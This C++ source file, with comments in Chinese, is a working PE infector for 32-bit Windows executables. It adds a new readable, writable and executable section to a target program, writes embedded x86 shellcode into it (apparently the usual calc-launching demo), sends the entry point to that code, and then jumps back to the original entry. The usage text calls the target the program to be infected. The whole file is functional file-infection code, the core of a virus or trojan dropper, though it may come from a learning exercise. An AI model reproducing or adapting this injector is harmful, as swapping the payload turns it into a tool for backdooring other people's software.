#include <iostream>
#include<windows.h>
#include<winnt.h>
//PE文件结构 ：https://blog.csdn.net/chkylin/article/details/47949029
#include <string>
#include <fstream>
#include <vector>

using namespace std;
typedef unsigned char u8;
char shellcode_x32[] = "\x31\xD2\x52\x68\x63\x61\x6C\x63\x54\x59\x52\x51\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x3B\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x42\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF0\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7";

/**
 * debug __LINE__ 出现错误的行号
 * */
void error(string msg, int line = 0) {
    if (line != 0) {
        cout << "LINE " << line << " ERROR:" << msg << endl;
    } else {
        cout << "ERROR:" << msg << endl;
    }
}

/** 输入指针 输入大小
 *  输出指针内容的byte!
 *  */
void show(void *src, int size) {
    char *p = (char *) src;
    for (int i = 0; i < size; i++) {
        if (i % 16 == 0) {
            cout << endl;
        }
        printf("%02x ", (unsigned char) *p);
        p++;
    }
}

/**
 * char*指针转化为16位数无符号数
 * */
static UINT16 uint8to16(UINT8 twouint8[2]) {
    return *(UINT16 *) twouint8;
}

static UINT32 uint8to32(UINT8 fouruint8[4]) {
    return *(UINT32 *) fouruint8;
}

static UINT64 uint8to64(UINT8 eightuint8[8]) {
    return *(UINT64 *) eightuint8;
}

/**
 * 分割字符串 结果输出到string vector
 * */
static vector<string> split(const string &str, const string &pattern) {
    vector<string> res;
    if (str == "")
        return res;
    //在字符串末尾也加入分隔符，方便截取最后一段
    string strs = str + pattern;
    size_t pos = strs.find(pattern);
    while (pos != strs.npos) {
        string temp = strs.substr(0, pos);
        res.push_back(temp);
        //去掉已分割的字符串,在剩下的字符串中进行分割
        strs = strs.substr(pos + 1, strs.size());
        pos = strs.find(pattern);
    }
    return res;
}

/** 添加新节的步骤
 * 1. 获取节的数目，并且将节的数目加一
 * 2. 添加一个新的节表头、设置节表的属性
 * 3. 根据新加的节表头的VA地址、设置程序的入口点
 * 4. 新增节表（文件末尾） 添加注入的shellcode
 * 5. 在shellcode后面添加jmp指令、转到原始入口点
 * */
int main(int argc, char *argv[]) {
    setbuf(stdout, nullptr);
    if (argc != 2) {
        cout << "请输入命令行参数\n inject.exe(本程序) target.exe(待感染的程序)\n";
        exit(-1);
    }
    string target = argv[1];
    ifstream f(target, ios::in | ios::binary);
    if (!f) {
        error("文件打开失败", __LINE__);
        exit(-1);
    }
    f.seekg(0, f.end);
    size_t fileSize = f.tellg();
    f.seekg(0, f.beg);// 定位到文件开始
    u8 *buffer = new u8[fileSize + 0x200];
    memset(buffer, 0, fileSize + 0x200);
    f.read((char *) buffer, fileSize);
    f.close();
    cout << "File length is " << fileSize << endl;
    // PE+0x40
    //NT文件头 第三部分起始地址位于：DOS头的0x3c处 四字节
    PIMAGE_NT_HEADERS32 pimageNtHeaders32;
    pimageNtHeaders32 = (PIMAGE_NT_HEADERS32) (buffer + uint8to32(buffer + 0x3c));
    cout << "展示NT文件头\n";
    show(pimageNtHeaders32, sizeof(IMAGE_NT_HEADERS32));
    WORD NumberOfSections = pimageNtHeaders32->FileHeader.NumberOfSections;
    cout << "\n节表数" << NumberOfSections << endl;
    // TODO 节表数
    pimageNtHeaders32->FileHeader.NumberOfSections += 1;

    DWORD AddressOfEntryPoint = pimageNtHeaders32->OptionalHeader.AddressOfEntryPoint;
    cout << "原始入口" << hex << AddressOfEntryPoint << endl;
    WORD optionHeaderSize = pimageNtHeaders32->FileHeader.SizeOfOptionalHeader;
    // 单个节表的大小为0x28
    PIMAGE_SECTION_HEADER pimageSectionHeader = (PIMAGE_SECTION_HEADER) (((u8 *) pimageNtHeaders32) + 0x18 +
                                                                         optionHeaderSize);
    cout << "NT Header size is " << hex << 0x18 + optionHeaderSize << endl;
    cout << "展示节表\n";
    show(pimageSectionHeader, 20);
    PIMAGE_SECTION_HEADER p = pimageSectionHeader + NumberOfSections - 1;
    //show(p, 0x28);
    // 新的程序入口点
    DWORD lastSectionSizeInMem;

    if (p->SizeOfRawData % 0x1000 == 0) {
        lastSectionSizeInMem = p->SizeOfRawData;
    } else {
        lastSectionSizeInMem = ((p->SizeOfRawData / 0x1000) + 1) * 0x1000;
    }
    // 程序入口点
    DWORD NewAddressOfEntryPoint = p->VirtualAddress + lastSectionSizeInMem;
    pimageNtHeaders32->OptionalHeader.AddressOfEntryPoint = NewAddressOfEntryPoint;
    // shellcode在文件的偏移（最后一个节的文件起始地址+文件大小）恰好等于文件原始大小
    // 这个地址就是新节的在文件的起始地址！
    DWORD shellcodeInjectAddress = p->SizeOfRawData + p->PointerToRawData;
    cout << hex << shellcodeInjectAddress << endl;
    p++;// 执行demo节表
    // 节表：https://www.cnblogs.com/zpchcbd/p/12321986.html
    // 设置新节的属性
    memset(p->Name, 0, 8);
    strncpy((char *) p->Name, ".zjc", strlen(".zjc"));
    p->Misc.VirtualSize = 0x200;
    p->VirtualAddress = NewAddressOfEntryPoint;
    p->SizeOfRawData = 0x200;
    p->PointerToRawData = shellcodeInjectAddress;
    p->Characteristics = 0xE00000E0;// 可读可写可执行
    pimageNtHeaders32->OptionalHeader.SizeOfImage = NewAddressOfEntryPoint + p->Misc.VirtualSize;
    cout << dec << strlen(shellcode_x32);
    u8 *shell = buffer + shellcodeInjectAddress;
    //show(shell, 100);
    u8 *q = shell;// q为了方便测试
    int len = strlen(shellcode_x32);
    memcpy(shell, shellcode_x32, len);
    shell = shell + len;
    // shell 指向后续的JMP内容
    // \xE8\x00\x00\x00\x00\x58\x83\xE8\x4A\x2D\x00\x30\x02\x00\x05\xC0\x13\x01\x00\xFF\xE0
    // call 0x00000000; pop eax;
    // 防止字符串被截断
    memcpy(shell, "\xE8\x00\x00\x00\x00\x58", 6);
    shell += 6;
    //sub eax,0x4d [strlen(shellcode)+5]
    u8 subeax0x4d[] = "\x83\xE8\x4D";
    subeax0x4d[2] = (u8) (strlen(shellcode_x32) + 5);
    memcpy(shell, subeax0x4d, 3);
    shell += 3;
    //sub eax,0x00023000;//
    //add eax,0x000113C0;//
    //jmp eax;FFE0
    u8 *jmp = new u8[12];
    memcpy(jmp, "\x2D\x00\x30\x02\x00\x05\xC0\x13\x01\x00\xFF\xE0", 12);
    memcpy(jmp + 1, &NewAddressOfEntryPoint, 4);
    memcpy(jmp + 6, &AddressOfEntryPoint, 4);
    memcpy(shell, jmp, 12);
    delete[]jmp;

    show(shell, 12);
    show(q, 100);

    vector<string> outputTarget = split(target, ".");
    if (outputTarget.size() != 2) {
        error("格式错误\n", __LINE__);
        exit(-1);
    }
    string output = outputTarget[0] + "_bake.exe";
    // 注意是二进制打开 否则会出错误
    ofstream out(output, ios::binary | ios::trunc);
    if (!out) {
        error("写文件打开失败\n");
        exit(-1);
    }
    out.write((char *) buffer, fileSize + 0x200);
    out.close();
    delete[]buffer;
    return 0;
}
